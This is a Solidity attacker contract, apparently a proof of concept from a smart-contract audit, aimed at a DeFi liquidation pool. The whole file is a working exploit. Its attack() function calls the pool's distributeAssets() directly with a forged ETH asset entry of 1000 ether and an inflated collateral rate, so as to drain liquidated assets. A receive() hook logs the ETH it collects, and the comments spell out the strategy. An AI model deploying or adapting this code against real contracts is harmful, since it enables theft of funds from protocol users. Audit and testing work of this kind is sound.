// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "contracts/interfaces/ITokenManager.sol";
import "contracts/interfaces/ILiquidationPoolManager.sol";
import "contracts/interfaces/ISmartVaultManager.sol";
import "hardhat/console.sol";

interface ILiquidationPool {
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external;
}

contract LiqPoolDistributeAssetsAttacker {
    ILiquidationPool private liquidationPool;
    ISmartVaultManager private SVManager;

    constructor(address _liquidationPool, address _TST, address _EUROs, address _SVManager) {
        liquidationPool = ILiquidationPool(_liquidationPool);
        SVManager = ISmartVaultManager(_SVManager);
    }

    //the attacker calls the distributeAssets() function in the LP with a very high collateral rate
    //and an Assets array that corresponds with the assets and asset balances that are currently available on the LPM
    //in our case, we assume there was a Vault liquidation that only contained native ETH
    function attack() public {
        ITokenManager.Token[] memory tokens = ITokenManager(SVManager.tokenManager()).getAcceptedTokens();
        ILiquidationPoolManager.Asset[] memory assets = new ILiquidationPoolManager.Asset[](tokens.length);

        for (uint256 i = 0; i < tokens.length; i++) {
            ITokenManager.Token memory token = tokens[i];
            if (token.addr == address(0)) {
                assets[0] = ILiquidationPoolManager.Asset(token, 1000 ether);
                break;
            }
        }

        liquidationPool.distributeAssets(assets, 999999999999, 1);
    }

    receive() external payable {
        console.log("Val: ", msg.value);
    }
}
